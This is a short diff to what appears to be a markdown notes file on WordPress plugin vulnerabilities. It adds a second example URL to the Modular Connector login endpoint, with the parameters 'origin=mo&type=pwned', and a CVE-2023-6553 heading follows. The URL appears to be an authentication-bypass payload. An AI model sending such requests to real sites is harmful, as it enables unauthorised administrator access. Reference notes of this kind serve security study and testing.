@@ -111,6 +111,8 @@ m  ---> Media IDs
 
 ```bash
 http://example.com/api/modular-connector/login/anything?origin=mo&type=foo
+
+http://example.com/api/modular-connector/login/doesnotexist?origin=mo&type=pwned
 ```
 
 # CVE-2023-6553
